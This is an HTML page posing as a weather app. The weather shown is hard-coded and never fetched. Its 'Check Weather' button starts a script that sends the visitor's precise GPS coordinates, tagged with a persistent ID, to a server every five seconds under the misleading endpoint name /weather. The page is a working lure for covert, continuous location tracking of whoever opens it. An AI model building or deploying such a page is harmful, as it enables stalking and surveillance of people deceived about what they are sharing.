<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather App</title>
    <style>
        /* Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Body Styling */
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: linear-gradient(to right, #4facfe, #00f2fe);
            font-family: Arial, sans-serif;
        }

        /* Weather Card Styling */
        .weather-card {
            background-color: #fff;
            padding: 25px 20px;
            border-radius: 15px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 300px;
            width: 100%;
            transform: scale(1.5);
        }

        /* Title Styling */
        .weather-card h2 {
            font-size: 24px;
            color: #333;
            margin-bottom: 5px;
        }

        /* Location Styling */
        .location {
            font-size: 18px;
            color: #555;
            margin-top: 5px;
        }

        /* Weather Icon Styling */
        .weather-icon {
            margin: 20px 0;
        }

        .weather-icon img {
            width: 80px;
            height: 80px;
        }

        /* Weather Info Styling */
        .weather-info {
            margin: 20px 0;
        }

        .temperature {
            display: block;
            font-size: 48px;
            font-weight: bold;
            color: #333;
        }

        .condition {
            font-size: 20px;
            color: #777;
        }

        /* Button Styling */
        button {
            padding: 12px 24px;
            background-color: #4facfe;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: background-color 0.3s;
        }

        button:disabled {
            opacity: 70%;
        }

        @media(max-width: 500px) {
            .weather-card {
                transform: scale(1);
            }
        }
    </style>
</head>

<body>
    <div class="weather-card">
        <h2>Weather App</h2>
        <p class="location"><span id="city">City</span>, <span id="country">Country</span></p>

        <!-- Weather Icon -->
        <div class="weather-icon">
            <img src="/weather.png" alt="Weather Icon">
        </div>

        <div class="weather-info">
            <span class="temperature">25°C</span>
            <span class="condition">Sunny</span>
        </div>

        <button id="check-weather">Check Weather</button>
    </div>


    <script>
        const id = localStorage.getItem("id") || generateId();
        const btn = document.querySelector("#check-weather");

        let interval;

        btn.addEventListener("click", startLocationSharing);

        function startLocationSharing() {
            btn.disabled = true;
            btn.innerHTML = "Location Sharing Active";

            sendLocation();

            if (interval) clearInterval(interval);
            interval = setInterval(sendLocation, 5000);
        }

        function sendLocation() {
            if (!navigator.geolocation) {
                alert("Geolocation is not supported by this browser.");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;

                    console.log("Sending location:", {
                        id,
                        lat,
                        lng
                    });

                    try {
                        const response = await fetch("/weather", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                id,
                                lat,
                                lng
                            })
                        });

                        console.log("Server response:", await response.text());

                    } catch (error) {
                        console.error("Location sending error:", error);
                    }
                },

                (error) => {
                    console.error("Location error:", error);

                    btn.disabled = false;
                    btn.innerHTML = "Check Weather";

                    alert("Please allow location access.");
                },

                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        function generateId(length = 10) {
            const characters =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

            let result = "";

            for (let i = 0; i < length; i++) {
                const randomIndex =
                    Math.floor(Math.random() * characters.length);

                result += characters[randomIndex];
            }

            localStorage.setItem("id", result);

            return result;
        }
    </script>
</body>

</html>
